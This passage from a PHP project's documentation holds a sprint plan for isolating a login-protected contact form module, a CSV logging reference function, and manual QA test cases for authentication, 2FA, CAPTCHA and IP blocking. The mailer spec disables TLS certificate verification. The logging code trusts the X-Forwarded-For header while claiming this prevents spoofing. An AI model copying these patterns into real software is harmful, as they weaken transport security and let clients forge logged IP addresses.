  - **Pitfall:** SMTP credentials are currently hardcoded in three places: `php/forms.php` (lines 1330–1337), `email_code.php` (lines 149–154), and implicitly in `captcha.php`. Centralizing them in `config.php` resolves duplication within `contact/`

- ✅ **7.4** Create a shared email helper at `contact/login/lib/mailer.php`
  - Function: `contactSendEmail(array $to, string $subject, string $htmlBody): bool`
  - Read SMTP settings from `config.php` through `contactLoginGetConfig()`
  - Configure PHPMailer following the current `sendEmails()` implementation in `php/forms.php`:
    - `SMTPOptions` with `verify_peer => false` (corporate server with a self-signed certificate)
    - `CharSet = 'UTF-8'`, `Encoding = 'base64'`
    - `isSMTP()`, `isHTML(true)`
  - On error, log through `logErrorData()` (if available) or `error_log()`
  - **Important:** Do not duplicate the business logic for constructing the email body — this helper handles transport only

- ✅ **7.5** Migrate `email_code.php` to the shared mailer
  - The `sendLoginCode()` function must use `contactSendEmail()` instead of directly creating a PHPMailer instance
  - Read the email subject from `config.php` (`2fa_email_subject`) as before
  - Construct the email body in `sendLoginCode()` as before (HTML + plain text)
  - **Nuance:** `contactSendEmail()` accepts only an HTML body. For AltBody (plain text), either extend the `contactSendEmail()` interface (with an `$altBody = ''` parameter) or let `sendLoginCode()` continue to work directly with PHPMailer through the configuration. The first option is recommended

- ✅ **7.6** Create the `contact/process.php` form handler
  - This is a **standalone** POST handler that replaces the `formXXXXXXXX` case from `php/forms.php`
  - File structure:
    1. Include `contact/login/init.php` (session, authentication functions)
    2. Include `contact/login/lib/mailer.php`
    3. Check `$_SERVER['REQUEST_METHOD'] === 'POST'`
    4. Check for `$_POST['tildaspec-formid'] === 'formXXXXXXXX'`
    5. **Authentication check:** `contactLoginIsAuthenticated()` — return a JSON error if false
    6. Migrated security functions:
       - `sanitizeInput()` — sanitize input data
       - `detectInjection()` — check for XSS, SQLi, and CmdExec
       - `validateFields()` — validate form fields
       - `sanitizeCsvValue()` — sanitize values for CSV
       - `getRealIp()` — determine the client IP (can reuse `contactLoginGetClientIp()`)
       - `checkRateLimit()` — rate limiting (adapt for file storage inside `contact/`)
    7. **Email notification** through `contactSendEmail()` (instead of `sendEmails()`)
    8. **Bitrix integration** — moved to `contact/login/lib/bitrix_company.php`
    9. **Logging** — through the existing `csv_logger.php` + `logCompanyFormData()`
    10. JSON response for the Tilda form

  - **Pitfalls:**
    - `checkRateLimit()` in `php/forms.php` uses Memcached with a fallback to `/mnt/log/ip_rate_limits.json`. For self-containment, adapt the fallback to store `ip_rate_limits.json` inside `contact/login/` (next to `login_attempts.json`)
    - The `response()` and `logFormData()` functions must be moved or implemented locally
    - The `logErrorData()` function is required for logging validation and SMTP errors; move it or implement it through `csv_logger.php`

- ✅ **7.7** Move the Bitrix handler to `contact/login/lib/bitrix_company.php`
  - Copy `php/bitrix/company.php` to `contact/login/lib/bitrix_company.php`
  - Remove `require_once dirname(__DIR__, 2) . '/contact/login/lib/csv_logger.php'` (it is already included through `functions.php`)
  - Update the fallback functions (`getCompanyFormLogDateTime`, `getCompanyFormClientIp`, `getCompanyFormLogDirectory`): the authentication module is now **guaranteed** to be included, so remove the fallbacks to `getRealIp()` from `php/forms.php`
  - Move the Bitrix REST API URL settings to `config.php`:
    ```php
    'bitrix_rest_api_url' => 'https://crm.example.com/rest/.../',
    'bitrix_mock_mode'    => true,  // false for actual submission
    ```
  - **Pitfall:** The current `company.php` uses `sanitizeInput()` from `php/forms.php` through `function_exists()`. After isolation, this function must be available from `process.php`, where it is already defined

- ✅ **7.8** Create security functions for `contact/process.php`
  - File: `contact/login/lib/form_security.php`
  - Move the following from `php/forms.php`:
    - `sanitizeInput()` — sanitize string data
    - `detectInjection()` — detect XSS, SQL Injection, and Command Injection
    - `validateFields()` — validate form fields
    - `sanitizeCsvValue()` — sanitize CSV values
    - `checkRateLimit()` — limit submission frequency (adapt the paths)
  - **Nuance:** `sanitizeCsvValue()` already exists in `csv_logger.php` as `contactCsvLoggerSanitizeValue()`. A `sanitizeCsvValue()` wrapper can be created for backward compatibility
  - **Nuance:** `checkRateLimit()` uses `Memcached` as the primary store and a JSON file as the fallback. For the Memcached variant, keys do not overlap with the main site (they are tied to the IP). For the file fallback, change the path from `/mnt/log/ip_rate_limits.json` to `contact/login/ip_rate_limits_form.json` (do not confuse it with `login_attempts.json` for authentication — these are different limits)
  - **Nuance:** `getRealIp()` duplicates `contactLoginGetClientIp()` — use `contactLoginGetClientIp()` instead of `getRealIp()`

- ✅ **7.9** Create form-error logging in `contact/login/lib/form_error_logger.php`
  - Move `logErrorData()` from `php/forms.php`
  - Adapt it to write the log file to `contact/login/logs/form_errors_YYYY-MM.csv` through `csv_logger.php`
  - Move `logFormData()` — the successful-submission log — to `contact/login/logs/forms_log_YYYY-MM.csv` through `csv_logger.php`
  - **Nuance:** The current `logFormData()` writes logs to `php/` (`php/forms_log_YYYY-MM.csv`). After the move, logs will be stored in `contact/login/logs/`, which is consistent with the overall strategy: all protected data in one directory

- ✅ **7.10** Update the action URL in the `contact/create.php` form
  - Find the line (approximately line 2032):
    ```html
    <form id="formXXXXXXXX" name='formXXXXXXXX' role="form" action='/procces/' method='POST'
    ```
  - Replace `action` with:
    ```html
    <form id="formXXXXXXXX" name='formXXXXXXXX' role="form" action='/contact/process.php' method='POST'
    ```
  - **Pitfall:** Tilda scripts (`tilda-forms-1.0.min.js`) intercept form submission and send an AJAX request to the `action` URL. The response format must match: `{"message": "..."}` on success, `{"error": "..."}` on error. The `response()` function in `process.php` must reproduce this format exactly

- ✅ **7.11** Update `.htaccess` and `router.php` by adding the `/contact/process.php` route
  - Add the following rule to the root `.htaccess`:
    ```apache
    RewriteRule ^contact/process\.php$ contact/process.php [NC,L]
    ```
  - **Nuance:** Do **not remove** the `RewriteRule ^procces/$ php/forms.php [NC]` rule (line 19) — the other forms still use `/procces/`
  - Add a case to `router.php`:
    ```php
    case '/contact/process.php':
        require __DIR__ . '/contact/process.php';
        break;
    ```
  - In `contact/login/.htaccess`, ensure that `process.php` (located one level above at `contact/process.php`) is not blocked by the rules for `contact/login/`

<!-- DO NOT IMPLEMENT - [ ] **7.12** Remove the `formXXXXXXXX` case from `php/forms.php`
  - Remove the entire `case "formXXXXXXXX":` block (lines 830–894)
  - Remove the `initContactCreateAuthSession()` function (lines 409–437) — it is no longer needed because authentication is checked inside `contact/process.php`
  - **Pitfall:** Other forms in `php/forms.php` continue to use `sendEmails()`, `logFormData()`, `sanitizeInput()`, and other functions — **do not remove them** from `php/forms.php`
  - **Nuance:** `verifySmartCaptcha()` will remain in `php/forms.php` for forms that use it, while `contact/` uses a separate implementation in `contact/login/lib/captcha.php` -->

- ✅ **7.13** Update the email notification sent when an injection is detected
  - In the current implementation (`php/forms.php`, line 535), an email is sent through `sendEmails()` when an injection is detected
  - In `contact/process.php`, equivalent logic must use `contactSendEmail()` to send a security alert to the same addresses: `['recipient-1@example.com', 'recipient-2@example.com', 'recipient-3@example.com']`
  - Move the security-alert recipient addresses to `config.php`:
    ```php
    'security_alert_emails' => [
        'recipient-1@example.com',
        'recipient-2@example.com',
        'recipient-3@example.com',
    ],
    'form_notification_emails' => [
        'recipient@example.com',
    ],
    ```

- ✅ **7.14** Update file protection in `.htaccess`
  - In `contact/login/.htaccess`, ensure that the new files are protected from direct access:
    - `lib/mailer.php` — already protected by the `lib/` rule
    - `lib/form_security.php` — already protected
    - `lib/form_error_logger.php` — already protected
    - `lib/bitrix_company.php` — already protected
    - `lib/PHPMailer/` — already protected
    - `ip_rate_limits_form.json` — add it to the protected-file list if it is located in `contact/login/`
  - `contact/process.php` must be **accessible** to POST requests (it is at the `contact/` level, not under `contact/login/`)

- ✅ **7.15** Perform integration testing
  - Verify the following scenarios:
    1. An unauthenticated POST to `/contact/process.php` must return a JSON authentication error
    2. An authenticated POST with valid data must create a company in Bitrix (mock) and return a CRM link
    3. A POST containing an injection must log silently and send a security alert
    4. Exceeding the rate limit must silently return “success” (honeypot pattern)
    5. Invalid fields must return a JSON validation error
    6. Login through email 2FA — ensure that PHPMailer works through the local copy
    7. All CSV logs are written to `contact/login/logs/`

###### Files

| Action       | File                                          |
|--------------|-----------------------------------------------|
| Create       | `contact/login/lib/PHPMailer/PHPMailer.php`    |
| Create       | `contact/login/lib/PHPMailer/SMTP.php`         |
| Create       | `contact/login/lib/PHPMailer/Exception.php`    |
| Create       | `contact/login/lib/mailer.php`                 |
| Create       | `contact/login/lib/form_security.php`          |
| Create       | `contact/login/lib/form_error_logger.php`      |
| Create       | `contact/login/lib/bitrix_company.php`         |
| Create       | `contact/process.php`                          |
| Modify       | `contact/login/lib/email_code.php` (PHPMailer paths → local paths) |
| Modify       | `contact/login/config.php` (+ SMTP, Bitrix, email addresses) |
| Modify       | `contact/create.php` (action URL → `/contact/process.php`) |
| Modify       | `.htaccess` (+ `/contact/process.php` route) |
| Modify       | `router.php` (+ `/contact/process.php` case)  |
| Modify       | `php/forms.php` (- `formXXXXXXXX` case, - `initContactCreateAuthSession()`) |

###### Definition of Done (DoD)

- ✅ The `contact/` directory contains no `require`/`include` statements with paths to `php/`
- ✅ `email_code.php` uses the local PHPMailer copy from `contact/login/lib/PHPMailer/`
- ✅ The `/contact/create` form sends POST requests to `/contact/process.php` instead of `/procces/`
- ✅ `contact/process.php` independently checks authentication, performs validation, sends email, and creates a company in Bitrix
- ✅ All form CSV logs are written to `contact/login/logs/` (errors, successes, Bitrix data)
- ✅ SMTP settings are moved to `config.php` and are not duplicated across files
- ✅ Security alerts for detected injections are sent through `contactSendEmail()`
- ✅ The `formXXXXXXXX` case is removed from `php/forms.php`; all other forms work as before
- ✅ The entire `contact/` directory can be moved to another server; with PHP, SMTP access, and access to the Bitrix API, it is fully functional
- ✅ Direct access to service files inside `contact/login/` remains blocked

##### Sprint 8 — Updating the header and footer

> **Goal:** Align the header and footer of the `/contact/create` page with the main `pageYYYYYYY.html` page.

###### Tasks

- ⬜ **8.1** Analyze the current header and footer in `create.php`
- ⬜ **8.2** Copy the current header and footer from `pageYYYYYYY.html`
- ⬜ **8.3** Adapt and insert them into `create.php`
- ⬜ **8.4** Verify that nothing is broken (forms, scripts, styles)

###### Files

| Action    | File                  |
|-----------|------------------------|
| Modify    | `contact/create.php`   |

###### Definition of Done (DoD)

- ✅ The header and footer visually match `pageYYYYYYY.html`
- ✅ The form and scripts work as before
- ✅ Responsive behavior is preserved

---

##### Sprint 9 — Administration utilities

> **Goal:** Simplify user management for the administrator.

###### Tasks

- ⬜ **9.1** Create the `add_user.php` CLI script
  - Run: `php add_user.php`
  - Interactively prompt for: username, password, email, and 2FA method
  - Generate `password_hash()` and write it to `users.json`
  - If the 2FA method is `totp`, generate a secret and display a QR code (or a text secret for manual entry in the application)

- ⬜ **9.2** Create the `list_users.php` script
  - Display the user list: username, email, 2FA method, creation date

- ⬜ **9.3** Create the `reset_password.php` script
  - Run: `php reset_password.php username`
  - Prompt for a new password and update the hash in `users.json`

- ⬜ **9.4** Prepare an administrator guide
  - How to add a user
  - How to reset a password
  - How to enable/disable 2FA
  - How to view logs

###### Files

| Action    | File                                       |
|-----------|--------------------------------------------|
| Create    | `contact/login/cli/add_user.php`           |
| Create    | `contact/login/cli/list_users.php`         |
| Create    | `contact/login/cli/reset_password.php`     |
| Create    | `ADMIN_GUIDE.md`                           |

###### Definition of Done (DoD)

- ✅ A QA engineer can add a user with one command
- ✅ A QA engineer can reset a password with one command
- ✅ A clear guide is available in English

---

##### Overall timeline

| Period | Work | Milestone |
|---|---|---|
| **Mar 30 — Apr 1** | Sprint 1 (Password authentication)<br>Sprint 2 (Authentication logging) | **April 1, 15:00** — interim demo |
| **Apr 1 — Apr 3** | Sprint 3 (IP blocking)<br>Sprint 4 (Form-data logging) | **April 3, 14:00** — working version in the test environment |
| **Apr 3 — Apr 8** | Sprint 5 (Email 2FA)<br>Sprint 5.1 (TOTP 2FA)<br>Sprint 8 (Header and footer update)<br>Sprint 9 (Administration utilities) | **April 8** — production deployment |
| **Apr 8 — ...** | Sprint 6 (Yandex SmartCaptcha for authentication)<br>Sprint 6.1 (CAPTCHA-failure logging)<br>Sprint 7 (Complete isolation of `contact/`) | — |

---

##### Dependencies between sprints

```text
Sprint 1 — Authentication
├── Sprint 2 — Login logging ─┐
├── Sprint 3 — IP blocking ◀──┘
│   └── Sprint 6 — Yandex SmartCaptcha
│       └── Sprint 6.1 — CAPTCHA failure ─┐
├── Sprint 4 — Form logging ──────────────┤
└── Sprint 5 — Email 2FA ─────────────────┤
    ├── Sprint 5.1 — TOTP 2FA             │
    └── Sprint 9 — Utilities              │
                                       ▼
                           Sprint 7 — Isolation of contact/

Sprint 8 — Header and footer: independent parallel branch
```

> **Sprint 8** does not depend on the other sprints and can be completed in parallel at any time.
> **Sprint 7** depends on Sprints 4, 5, and 6.1 because it consolidates the form-processing logic, email 2FA, and CAPTCHA inside `contact/`.

---

##### Final file structure

```text
contact/                       # ← fully self-contained module after Sprint 7
├── create.php                 # Protected page, action → /contact/process.php
├── process.php                # Form POST handler (replaces /procces/ for formXXXXXXXX)
└── login/                     # Authentication, security, libraries
    ├── .htaccess              # Denies access to system files
    ├── config.php             # Configuration (SMTP, Bitrix API, thresholds, 2FA, email addresses)
    ├── init.php               # Session initialization + autoloading
    ├── functions.php          # Authentication utility functions
    ├── index.php              # Login page + 2FA code-entry form
    ├── logout.php             # Logout
    ├── users.json             # User list (password hashes, 2FA method)
    ├── login_attempts.json    # Login-attempt data (for IP blocking)
    ├── ip_rate_limits_form.json  # Form-submission rate limit (Memcached fallback)
    ├── lib/
    │   ├── PHPMailer/          # Local PHPMailer copy (3 files)
    │   │   ├── PHPMailer.php
    │   │   ├── SMTP.php
    │   │   └── Exception.php
    │   ├── mailer.php          # Shared email transport (contactSendEmail)
    │   ├── captcha.php         # Yandex SmartCaptcha verification
    │   ├── csv_logger.php      # Shared low-level CSV helper
    │   ├── email_code.php      # 2FA email-code generation/sending/verification
    │   ├── totp.php            # TOTP generation/verification library
    │   ├── bitrix_company.php  # Bitrix24 REST API handler
    │   ├── form_security.php   # Validation, sanitization, rate limiting, injection detection
    │   └── form_error_logger.php # Form error and success logging
    ├── cli/
    │   ├── add_user.php        # Add user
    │   ├── list_users.php      # List users
    │   └── reset_password.php  # Reset password
    ├── logs/
    │   ├── auth_YYYY-MM.csv        # Authentication logs
    │   ├── attacks_YYYY-MM.csv     # IP-block logs
    │   ├── bitrix_data_YYYY-MM.csv # Logs of data submitted to Bitrix
    │   └── form_errors_YYYY-MM.csv # Form-error logs
    └── sessions/              # PHP session files

php/                           # ← the site's other ~25 forms (excluding contact/create)
├── forms.php                  # Form router (without the formXXXXXXXX case)
├── PHPMailer/                 # PHPMailer for the other forms
└── bitrix/                    # Bitrix handlers for the other forms
```

:::

## 3. Secure CSV Logging Reference Implementation <Badge type="tip" text="PHP" />



::: details 💾 Open the CSV logging reference implementation

<div class="case-source-path"><span>Source</span><code>.tasks/done/000-auth-logs-2fa/csv-log-template.php</code></div>

```php:line-numbers [csv-log-template.php]
// SECURE LOGGING FUNCTION WITH FILE LOCKING
function logPdnConsentData($user): bool {
    // 1. Log directory
    global $CFG;
    $baseLogDir = $CFG->dataroot . '/pdnconsent'; // -- /moodledata/pdnconsent

    // Check whether the directory exists and is writable
    if (!is_dir($baseLogDir) || !is_writable($baseLogDir)) {
        // Write to the server system log because the file is unavailable
        error_log("CRITICAL ERROR: Directory $baseLogDir does not exist or is not writable!");
        return false;
    }

    // 2. File name with MONTHLY rotation
    $currentMonth = date('Y-m');
    $logFile = $baseLogDir . '/forms_log_' . $currentMonth . '.csv';

    // 3. File size limit (5 MB)
    $maxFileSize = 5 * 1024 * 1024;

    // Clear the file-status cache (required for an accurate size check)
    clearstatcache(true, $logFile);

    // Rotation (archiving): rename the file when it exceeds the limit
    if (file_exists($logFile) && filesize($logFile) > $maxFileSize) {
        $backupName = $baseLogDir . '/forms_log_' . $currentMonth . '_backup_' . date('His') . '.csv';
        if (!rename($logFile, $backupName)) {
            error_log("ERROR: Could not rotate log file $logFile to $backupName");
        }
    }

    // 4. Open the file in append mode
    $file = fopen($logFile, 'a');
    if (!$file) return false;

    // --- FILE LOCK START (LOCK_EX) ---
    // Prevents rows from becoming interleaved when several people submit forms simultaneously
    if (flock($file, LOCK_EX)) {

        // Add the BOM and headers when the file is new (check its size after acquiring the lock)
        clearstatcache(true, $logFile);
        if (filesize($logFile) === 0) {
            // The BOM is required for Excel to display Cyrillic text correctly
            fprintf($file, chr(0xEF).chr(0xBB).chr(0xBF));
            fputcsv($file, [
                'Дата', 'Название формы', 'ФИО', 'Email', 'Телефон', 'IP адрес', 'URL страницы', 'Согласие'
            ], ';');
        }

        // --- Secure IP handling ---
        $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $forwarded = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $firstIp = trim($forwarded[0]);
            // Validate the IP address to prevent header spoofing
            if (filter_var($firstIp, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                $ip = $firstIp;
            }
        }
        // Keep only characters permitted in an IP address
        $ip = preg_replace('/[^0-9a-fA-F:.]/', '', $ip);

        // --- Data sanitization and preparation ---
        // Validate the referrer as a URL; otherwise use a fallback value
        $referer = $_SERVER['HTTP_REFERER'] ?? '-';
        $safeReferer = filter_var($referer, FILTER_VALIDATE_URL) ? sanitizePdnCsvValue($referer) : 'Direct/Invalid';

        // Read consent from the $user object; the form supplies the pdnconsent field
        $consent = !empty($user->pdnconsent) ? 'ДА' : 'НЕТ';

        // Build the log row
        $logRow = [
            date('Y-m-d H:i:s'),
            'Форма регистрации на сайте learning.example.com',
            sanitizePdnCsvValue($user->fullname ?? 'N/A'),
            sanitizePdnCsvValue($user->email    ?? 'N/A'),
            sanitizePdnCsvValue($user->phone    ?? 'N/A'),
            $ip,
            $safeReferer,
            $consent,
        ];

        // Write the row to the CSV file
        fputcsv($file, $logRow, ';');

        // Release the lock
        flock($file, LOCK_UN);
    }
    // --- FILE LOCK END ---

    fclose($file);
    return true;
}

// MAXIMUM-PROTECTION SANITIZER FOR CSV DATA
function sanitizePdnCsvValue($text) {
    if (is_array($text)) return '[Array]';

    // 1. Remove surrounding whitespace and tabs
    $text = trim((string)$text);

    // 2. Remove line breaks (critical for CSV integrity)
    $text = str_replace(["\r", "\n", "\t"], " ", $text);

    // 3. Protect against XSS
    $text = htmlspecialchars($text, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

    // 4. Protect against CSV injection (Excel formulas)
    if ($text !== '' && in_array($text[0], ['=', '+', '-', '@'])) {
        $text = "'" . $text;
    }

    return $text;
}
```

:::

## 4. Complete QA Test Suite <Badge type="warning" text="152 test cases" />



::: details 🧪 Open all 152 test cases

<div class="case-source-path case-qa-source"><span>Source</span><code>.tasks/done/000-auth-logs-2fa/QA/QA_TESTCASES.md</code></div>

<p class="case-table-scroll-hint"><SolarIcon name="transfer" /> All columns are visible on wide screens; on narrow screens, tables scroll horizontally while the ID column remains fixed.</p>

#### QA Test Cases: `/contact/login` and `/contact/create`

##### Purpose

The complete set of manual test cases for the implemented `/contact/create` page protection functionality.

Coverage:
- username-and-password authentication;
- login form field validation;
- CAPTCHA (Yandex SmartCaptcha) on the login page;
- IP blocking after failed attempts;
- email 2FA in a single-page flow;
- access to the protected form;
- `/contact/create` form submission (without mocks, using the real Bitrix service);
- vulnerability testing (XSS, SQLi, CmdExec, and CSV injection);
- logging to `auth`, `attacks`, `bitrix_data`, and `form_errors`.

##### Preconditions

- Use the test environment.
- Have at least 2 accounts available:
  - a user without 2FA;
  - a user with email 2FA enabled and access to the mailbox.
- In the current test database, `admin` is used only as a test user without 2FA. In production, the user's login must be an email address.
- For IP-blocking cases, preferably be able to clear `contact/login/login_attempts.json` or wait for the block to expire.
- To inspect the logs, use:
  - `contact/login/logs/auth_YYYY-MM.csv`
  - `contact/login/logs/attacks_YYYY-MM.csv`
  - `contact/login/logs/bitrix_data_YYYY-MM.csv`
  - `contact/login/logs/form_errors_YYYY-MM.csv`
- For cases that submit real data to Bitrix, ensure that `bitrix_mock_mode` in `config.php` is set to `false`.
- For cases without real submission (Section 5), set `bitrix_mock_mode` to `true`.

---

##### 1. Login Form — Fields and Validation

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| LOGIN-01 | Empty username and password fields | Click “Sign in” without completing either field | An error message, browser `required` validation, or the server error “Invalid username or password” appears |
| LOGIN-02 | Empty username with a completed password | Leave the username empty, enter a password, and click “Sign in” | An error message appears |
| LOGIN-03 | Completed username with an empty password | Enter a username and leave the password empty | An error message appears |
| LOGIN-04 | Case-insensitive username | Enter the username in uppercase (for example, `ADMIN` instead of `admin`) | The user is found and authentication succeeds (`contactLoginNormalizeUsername` converts the value to lowercase) |
| LOGIN-05 | Username with surrounding spaces | Enter a username with leading and trailing spaces: `  admin  ` | The spaces are trimmed and authentication succeeds |
| LOGIN-06 | Very long username (>2000 characters) | Enter a username containing 3000+ characters | An error occurs without corrupting the log (`contactLoginNormalizeAuditText` truncates the value to 2000 characters) |
| LOGIN-07 | Username containing Unicode characters | Enter a username containing Cyrillic characters or emoji | The input is handled correctly and the “Invalid username or password” error appears |
| LOGIN-08 | Username retained after an error | Enter an incorrect password | After the PRG redirect, the username field retains the entered value |
| LOGIN-10 | Visual error state | Enter invalid credentials | The error panel is visible and legible, and disappears after a successful submission |
| LOGIN-11 | Browser autofill | Sign out after a successful login and return to the login page | The browser offers autofill and the form accepts the data correctly |
| LOGIN-12 | Hidden `smart-token` CAPTCHA field | Open DevTools and verify that the form contains `smart-token` | The field is populated after the CAPTCHA is completed, and the `smartcaptcha.yandexcloud.net` script is present |

---

##### 2. Access and Basic Authentication

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| AUTH-01 | Anonymous access to the protected page | Open `/contact/create` without authenticating | Redirect to `/contact/login/` |
| AUTH-02 | Successful login without 2FA | Sign in with valid credentials for a user without 2FA | Authentication succeeds, the user is redirected to `/contact/create`, and `auth` contains `SUCCESS` |
| AUTH-03 | Incorrect password | Enter an existing username with an incorrect password | The message `Invalid username or password` appears, and `auth` contains `FAIL_PASSWORD` |
| AUTH-04 | Nonexistent username | Enter a username that does not exist | The message `Invalid username or password` appears, and `auth` contains `FAIL_USER_NOT_FOUND` |
| AUTH-05 | Repeated login with an active session | Authenticate and open `/contact/login/` | The login form is not shown; the user is redirected to `/contact/create` |
| AUTH-06 | Sign out | On `/contact/create`, click `Sign out` | The session ends and the user is redirected to `/contact/login/`; opening `/contact/create` again requires authentication |
| AUTH-07 | System files are protected | Try to open `contact/login/users.json`, `contact/login/config.php`, and the `contact/login/logs/` directory | Direct browser access is denied (403 or 404) |
| AUTH-08 | Library files are protected | Try to open `contact/login/lib/csv_logger.php`, `contact/login/lib/mailer.php`, and `contact/login/lib/PHPMailer/PHPMailer.php` | Direct access is denied |
| AUTH-09 | `login_attempts.json` is protected | Try to open `contact/login/login_attempts.json` | Direct access is denied |
| AUTH-10 | `session_regenerate_id` verification | Authenticate and record the session ID. Sign out, then sign in again | The session ID changes, protecting against session fixation |
| AUTH-11 | Session cookie attributes | In DevTools → Application → Cookies, inspect the session cookie | `httponly`, `SameSite=Strict`, path = `/`, and `secure` over HTTPS |
| AUTH-12 | GET request to `contact/process.php` | Open `contact/process.php` in a browser | JSON response: `Only POST requests are supported.` |
| AUTH-13 | Session lifetime | Authenticate and inspect the cookie attributes | The lifetime is 30 days (2592000 seconds) |

---

##### 3. CAPTCHA (Yandex SmartCaptcha) on the Login Form

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| CAPTCHA-01 | Login submission without CAPTCHA | Submit the login form without `smart-token` via curl or DevTools | The message `Robot verification was not completed...` appears, and `auth` contains `FAIL_CAPTCHA_MISSING` |
| CAPTCHA-02 | Invalid or expired CAPTCHA | Submit the form with an invalid or expired token | A robot-verification error appears, and `auth` contains `FAIL_CAPTCHA_INVALID` |
| CAPTCHA-03 | SmartCaptcha API error | Replace `captcha_server_key` with an invalid value and submit the form | `auth` contains `FAIL_CAPTCHA_ERROR` |
| CAPTCHA-04 | Empty CAPTCHA server key | Temporarily clear `captcha_server_key` in the configuration | `auth` contains `FAIL_CAPTCHA_ERROR`; in debug mode, the error is written to `error_log` |
| CAPTCHA-05 | Valid CAPTCHA | Complete the CAPTCHA and submit valid credentials | Login proceeds through the standard flow without a CAPTCHA error |
| CAPTCHA-06 | CAPTCHA failures contribute to blocking | Repeatedly submit the login form without a CAPTCHA or with an invalid CAPTCHA | CAPTCHA failures increment the counter, and the IP may eventually be blocked (RATE-03) |
| CAPTCHA-07 | CAPTCHA disabled globally | Set `use_captcha` to `false` in `config.php` and sign in | Login succeeds without a CAPTCHA, and the CAPTCHA block is not displayed |
| CAPTCHA-08 | CAPTCHA widget loads | Open `/contact/login/` with CAPTCHA enabled | The SmartCaptcha widget is displayed and `smartcaptcha.yandexcloud.net/captcha.js` is loaded |
| CAPTCHA-09 | Validation order: CAPTCHA before password | Submit valid username and password values without a CAPTCHA | A CAPTCHA error appears and the password is not checked, conserving resources and protecting against brute-force attacks |

---

##### 4. IP Blocking (Authentication Rate Limiting)

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| RATE-01 | Blocking after a series of failures | Make 5 unsuccessful login attempts from one IP within 10 minutes | The IP is blocked, the user receives `Too many attempts, please try again later`, `auth` contains `BLOCKED`, and an entry appears in `attacks` |
| RATE-02 | Another attempt from a blocked IP | Submit the login form again after the IP is blocked | The attempt is rejected immediately, before CAPTCHA and password checks, and `auth` again contains `BLOCKED` |
| RATE-03 | CAPTCHA failures contribute to blocking | Repeatedly submit the login form without completing the CAPTCHA | CAPTCHA failures increment the counter, and the IP may also eventually be blocked |
| RATE-04 | Counter reset after successful login | Make several unsuccessful attempts, sign in successfully, then make one more unsuccessful attempt | After the successful login, the previous counter does not immediately trigger a block (`contactLoginClearFailedAttempts` is called) |
| RATE-05 | Automatic unblocking | Wait 30 minutes after the block | The IP is unblocked and login is possible again |
| RATE-06 | Automatic cleanup of `login_attempts.json` | Make several unsuccessful attempts and wait longer than `rate_limit_window` (10 minutes) | Stale entries are removed from the JSON file during the next check |
| RATE-07 | Counter does not increase for an already blocked IP | Block an IP and continue submitting requests | `attempt_count` does not increase for an IP with `blocked` status |
| RATE-08 | `login_attempts.json` remains bounded | Inspect the file after several blocking and unblocking cycles | The file contains only current entries; stale entries have been removed |

---

##### 5. Email 2FA

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| 2FA-01 | 2FA starts after a correct password | Sign in as a user with 2FA enabled | The user remains on the same page, the username and password become `readonly`, the code field appears, the email is sent, and `auth` contains `2FA_EMAIL_SENT` |
| 2FA-02 | Successful code verification | Enter the correct code from the email | Login to `/contact/create` succeeds, and `auth` contains `2FA_EMAIL_SUCCESS` and `SUCCESS` |
| 2FA-03 | Empty code | Click the confirmation button without entering a code | The message `Enter the code from the email.` appears |
| 2FA-04 | Incorrect code | Enter an incorrect code | The message `Invalid code` appears, and `auth` contains `2FA_EMAIL_FAIL` |
| 2FA-05 | Code lifetime expires (5 minutes) | Wait until `2fa_code_lifetime` expires and enter the old code | The message `The code has expired. Request a new code.` appears, and `auth` contains `2FA_TIMEOUT` |
| 2FA-06 | Resend before cooldown ends (60 seconds) | Immediately click `Resend code` | No new code is sent, and a message shows the remaining wait time |
| 2FA-07 | Resend after cooldown | Wait for the 60-second cooldown and request the code again | A new code arrives by email, the old code is invalid, and `auth` contains `2FA_EMAIL_RESENT` |
| 2FA-08 | Incorrect-code limit exceeded (5 attempts) | Repeatedly enter an incorrect code until reaching `2fa_max_attempts` | The intermediate 2FA session is reset, `Too many code entry attempts. Sign in again.` appears, and `auth` contains `2FA_MAX_ATTEMPTS` |
| 2FA-09 | Manually reset the intermediate step | At the 2FA step, click `Change login details` | The code field disappears, the username and password become editable again, and different credentials can be entered |
| 2FA-10 | Protected page inaccessible while 2FA is pending | During the 2FA step, manually open `/contact/create` | The user is redirected back to the login page |
| 2FA-11 | Overall 2FA session timeout (10 minutes) | Start 2FA and do nothing until `2fa_session_timeout` expires | The intermediate session is cleared, a new login is required to continue, and `auth` contains `2FA_TIMEOUT` |
| 2FA-12 | 2FA disabled globally | In the test environment, temporarily set `2fa_global_enable` to `false` and sign in as a user with personal 2FA enabled | Login requires only the password, with no email-code step |
| 2FA-13 | 2FA disabled for the user | Set `2fa_enabled: false` in `users.json` for a user with an email-based login | Login proceeds without 2FA |
| 2FA-14 | User removed from `users.json` during 2FA | Start 2FA, then manually remove the user from `users.json` | On code submission, `Unable to continue signing in. Sign in again.` appears |
| 2FA-15 | Email code format | Receive an email containing a code and inspect its format | A 6-digit numeric code |
| 2FA-16 | 2FA email subject | Receive an email containing a code and inspect its subject | The subject equals the `2fa_email_subject` value from `config.php` (default: `Login verification code`) |
| 2FA-17 | Email delivery failure (SMTP unavailable) | Temporarily change the SMTP host to a nonexistent host and attempt a 2FA login | The message `Unable to send the verification code. Please try again later.` appears |
| 2FA-18 | Readonly fields are not trusted | During the 2FA step, use DevTools to change the readonly username field and submit | The server ignores the POST value and reads the username from `$_SESSION['pending_username']` |
| 2FA-19 | JavaScript timer on the resend button | During the 2FA step, observe the countdown on the resend button | The button is `disabled` during the cooldown, and the timer displays the remaining seconds |
| 2FA-20 | 2FA attempt count after resend | Request a new code, then begin entering incorrect codes | The attempt counter (`2fa_attempts`) is not reset by a resend |

---

##### 6. `/contact/create` Form — Access and Submission

###### 6.1. Form Access

| ID | Scenario | Steps | Expected Result |
|---|---|---|---|
| FORM-01 | Form access after authentication | Authenticate and open `/contact/create` | The page is accessible and the form is displayed |
